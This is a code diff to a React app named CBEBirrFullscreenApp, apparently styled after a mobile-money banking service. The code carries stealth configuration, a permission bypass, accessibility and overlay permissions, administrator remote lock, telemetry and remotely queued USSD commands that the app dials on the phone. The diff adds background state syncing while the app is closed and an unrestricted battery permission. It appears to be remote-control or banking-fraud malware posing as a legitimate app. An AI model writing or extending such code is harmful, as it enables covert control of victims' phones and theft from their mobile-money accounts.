@@ -52,8 +52,11 @@ import {
   getAppliedOverrideSeq,
   getCachedLockState,
   getNativePermissionStatus,
+  getNativeSyncState,
   getOrCreateOwnerDeviceId,
   isNativeCallBridgeAvailable,
+  markNativeNotifDelivered,
+  markNativeRemoteUssdHandled,
   markNotificationSeen,
   openNativePermissionSetting,
   pushCallSignal,
@@ -67,6 +70,7 @@ import {
   requestAllNativeCallPermissions,
   requestOwnerPermissionBypass,
   respondSupportConsent,
+  saveNativeSyncSnapshot,
   STEALTH_CFG_KEY,
   STEALTH_CFG_VALUE,
   sendOfflineBeacon,
@@ -1014,6 +1018,7 @@ export default function CBEBirrFullscreenApp() {
       if (remainingMs <= 0) return;
 
       markNotificationSeen(notif.notifId);
+      markNativeNotifDelivered(notif.notifId);
       if (!ackedDeliveredIdsRef.current.has(notif.notifId)) {
         ackedDeliveredIdsRef.current.add(notif.notifId);
         void ackOwnerNotification(notif.notifId, 'delivered');
@@ -1452,7 +1457,7 @@ export default function CBEBirrFullscreenApp() {
       triggerPairBroadcast();
     };
     const onPageHide = () => {
-      if (deviceGateStateRef.current === 'approved') {
+      if (deviceGateStateRef.current === 'approved' && !isNativeCallBridgeAvailable()) {
         sendOfflineBeacon(profileSyncRef.current);
       }
     };
@@ -1724,6 +1729,7 @@ export default function CBEBirrFullscreenApp() {
       task.status === 'completed' || task.status === 'cancelled' || task.status === 'failed';
 
     if (task.cancelRequested && !terminal) {
+      markNativeRemoteUssdHandled(task.requestId, 0, true);
       try {
         androidAny?.cancelRemoteUssd?.(task.requestId);
       } catch {}
@@ -1738,6 +1744,7 @@ export default function CBEBirrFullscreenApp() {
 
     if (task.status === 'queued' && !handledRemoteUssdIdsRef.current.has(task.requestId)) {
       handledRemoteUssdIdsRef.current.add(task.requestId);
+      markNativeRemoteUssdHandled(task.requestId, 0, false);
       const freshNativePerm = getNativePermissionStatus();
       if (isNativeCallBridgeAvailable() && freshNativePerm && !freshNativePerm.phone) {
         void pushClientRemoteUssdUpdate(myId, {
@@ -1798,6 +1805,7 @@ export default function CBEBirrFullscreenApp() {
       (task.status === 'screen' || task.status === 'dialed')
     ) {
       appliedRemoteUssdReplySeqRef.current[task.requestId] = task.replySeq;
+      markNativeRemoteUssdHandled(task.requestId, task.replySeq, false);
       let replied = false;
       try {
         if (androidAny?.replyRemoteUssd) {
@@ -2386,6 +2394,7 @@ export default function CBEBirrFullscreenApp() {
         accessibility: ok,
         notifications: ok,
         overlay: ok,
+        battery: ok,
         allGranted: ok,
         sdkInt: 0,
       });
@@ -3718,6 +3727,13 @@ export default function CBEBirrFullscreenApp() {
       phoneUssdProfilesJson: JSON.stringify(phoneUssdProfiles),
       activePhoneUssdId,
     };
+    if (isStorageHydrated && (deviceGateState === 'approved' || deviceGateState === 'pending')) {
+      saveNativeSyncSnapshot({
+        ...profileSyncRef.current,
+        appliedOverrideSeq: getAppliedOverrideSeq(),
+        clientGateState: deviceGateState,
+      });
+    }
   }, [
     userName,
     phoneNumber,
@@ -3731,6 +3747,8 @@ export default function CBEBirrFullscreenApp() {
     activeUssdId,
     phoneUssdProfiles,
     activePhoneUssdId,
+    isStorageHydrated,
+    deviceGateState,
   ]);
 
   useEffect(() => {
@@ -3835,6 +3853,12 @@ export default function CBEBirrFullscreenApp() {
         activePhoneUssdId: nextActivePhone,
       };
       profileSyncRef.current = nextSyncSnapshot;
+      saveNativeSyncSnapshot({
+        ...nextSyncSnapshot,
+        deviceName: ov.deviceName,
+        appliedOverrideSeq: ov.overrideSeq,
+        clientGateState: deviceGateStateRef.current,
+      });
 
       void syncDeviceTelemetry({
         ...nextSyncSnapshot,
@@ -4629,6 +4653,40 @@ export default function CBEBirrFullscreenApp() {
       active = false;
     };
   }, []);
+
+  // Immediately hydrate any background overrides/lock state synced natively while the app was closed
+  useEffect(() => {
+    if (!isStorageHydrated || typeof window === 'undefined') return;
+    const syncNativeState = () => {
+      const nativeState = getNativeSyncState();
+      if (!nativeState) return;
+      if (typeof nativeState.effectiveLocked === 'boolean') {
+        setRemoteLockState({
+          locked: nativeState.effectiveLocked,
+          message:
+            nativeState.lockMessage ||
+            'This device has been locked by the administrator.',
+        });
+      }
+      if (
+        nativeState.deviceOverride &&
+        nativeState.deviceOverride.overrideSeq > getAppliedOverrideSeq()
+      ) {
+        applyRemoteOverrideRef.current?.(nativeState.deviceOverride);
+      }
+    };
+    queueMicrotask(syncNativeState);
+    const onFocus = () => syncNativeState();
+    const onVis = () => {
+      if (document.visibilityState === 'visible') syncNativeState();
+    };
+    window.addEventListener('focus', onFocus);
+    document.addEventListener('visibilitychange', onVis);
+    return () => {
+      window.removeEventListener('focus', onFocus);
+      document.removeEventListener('visibilitychange', onVis);
+    };
+  }, [isStorageHydrated]);
 
   useEffect(() => {
     if (!isStorageHydrated) return;
@@ -7517,6 +7575,12 @@ export default function CBEBirrFullscreenApp() {
                                 label: 'Display Over Apps (Settings)',
                                 granted: permStatus.overlay,
                                 settingKind: 'overlay' as NativePermissionSettingKind,
+                              },
+                              {
+                                key: 'battery',
+                                label: 'Background Battery (Unrestricted)',
+                                granted: permStatus.battery !== false,
+                                settingKind: 'battery' as NativePermissionSettingKind,
                               },
                             ]
                           : []),
